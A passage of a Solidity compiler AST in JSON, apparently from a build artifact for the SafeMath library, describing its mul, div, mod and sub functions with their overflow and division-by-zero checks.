														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 236,
														"src": "3645:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 219,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3645:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 224,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 223,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 221,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 206,
														"src": "3657:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 222,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 208,
														"src": "3661:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3657:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3645:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 230,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 228,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 226,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 220,
																	"src": "3680:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 227,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 206,
																	"src": "3684:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3680:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 229,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 208,
																"src": "3689:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3680:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 231,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3692:35:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 225,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3672:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 232,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3672:56:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 233,
												"nodeType": "ExpressionStatement",
												"src": "3672:56:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 234,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 220,
													"src": "3745:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 212,
												"id": 235,
												"nodeType": "Return",
												"src": "3738:8:0"
											}
										]
									},
									"documentation": {
										"id": 204,
										"nodeType": "StructuredDocumentation",
										"src": "3297:236:0",
										"text": " @dev Returns the multiplication of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `*` operator.\n Requirements:\n - Multiplication cannot overflow."
									},
									"id": 237,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 209,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 206,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 237,
												"src": "3551:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 205,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3551:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 208,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 237,
												"src": "3562:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 207,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3562:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3550:22:0"
									},
									"returnParameters": {
										"id": 212,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 211,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 237,
												"src": "3596:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 210,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3596:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3595:9:0"
									},
									"scope": 354,
									"src": "3538:215:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 258,
										"nodeType": "Block",
										"src": "4284:83:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 250,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 248,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 242,
																"src": "4302:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 249,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4306:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4302:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 251,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4309:28:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 247,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "4294:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 252,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4294:44:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 253,
												"nodeType": "ExpressionStatement",
												"src": "4294:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 256,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 254,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 240,
														"src": "4355:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 255,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 242,
														"src": "4359:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4355:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 246,
												"id": 257,
												"nodeType": "Return",
												"src": "4348:12:0"
											}
										]
									},
									"documentation": {
										"id": 238,
										"nodeType": "StructuredDocumentation",
										"src": "3759:453:0",
										"text": " @dev Returns the integer division of two unsigned integers, reverting on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 259,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 243,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 240,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 259,
												"src": "4230:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 239,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4230:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 242,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 259,
												"src": "4241:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 241,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4241:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4229:22:0"
									},
									"returnParameters": {
										"id": 246,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 245,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 259,
												"src": "4275:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 244,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4275:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4274:9:0"
									},
									"scope": 354,
									"src": "4217:150:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 280,
										"nodeType": "Block",
										"src": "4887:81:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 272,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 270,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 264,
																"src": "4905:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 271,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4909:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4905:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 273,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4912:26:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 269,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "4897:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 274,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4897:42:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 275,
												"nodeType": "ExpressionStatement",
												"src": "4897:42:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 278,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 276,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 262,
														"src": "4956:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 277,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 264,
														"src": "4960:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4956:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 268,
												"id": 279,
												"nodeType": "Return",
												"src": "4949:12:0"
											}
										]
									},
									"documentation": {
										"id": 260,
										"nodeType": "StructuredDocumentation",
										"src": "4373:442:0",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 281,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 265,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 262,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 281,
												"src": "4833:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 261,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4833:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 264,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 281,
												"src": "4844:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 263,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4844:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4832:22:0"
									},
									"returnParameters": {
										"id": 268,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 267,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 281,
												"src": "4878:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 266,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4878:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4877:9:0"
									},
									"scope": 354,
									"src": "4820:148:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 304,
										"nodeType": "Block",
										"src": "5527:68:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 296,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 294,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 286,
																"src": "5545:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 295,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 284,
																"src": "5550:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "5545:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 297,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 288,
															"src": "5553:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 293,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5537:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 298,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5537:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 299,
												"nodeType": "ExpressionStatement",
												"src": "5537:29:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 302,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 300,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 284,
														"src": "5583:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 301,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 286,
														"src": "5587:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5583:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 292,
												"id": 303,
												"nodeType": "Return",
												"src": "5576:12:0"
											}
										]
									},
									"documentation": {
										"id": 282,
										"nodeType": "StructuredDocumentation",
										"src": "4974:453:0",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n overflow (when the result is negative).\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {trySub}.\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 305,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 289,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 284,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5445:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 283,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5445:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 286,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5456:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 285,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5456:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 288,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5467:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 287,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5467:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5444:50:0"
									},
									"returnParameters": {
										"id": 292,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 291,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5518:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 290,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5518:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5517:9:0"
									},
									"scope": 354,
									"src": "5432:163:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 328,
										"nodeType": "Block",
										"src": "6347:67:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 320,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 318,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 310,
																"src": "6365:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 319,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6369:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "6365:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 321,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 312,
															"src": "6372:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 317,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "6357:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 322,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6357:28:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 323,
												"nodeType": "ExpressionStatement",
												"src": "6357:28:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 326,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
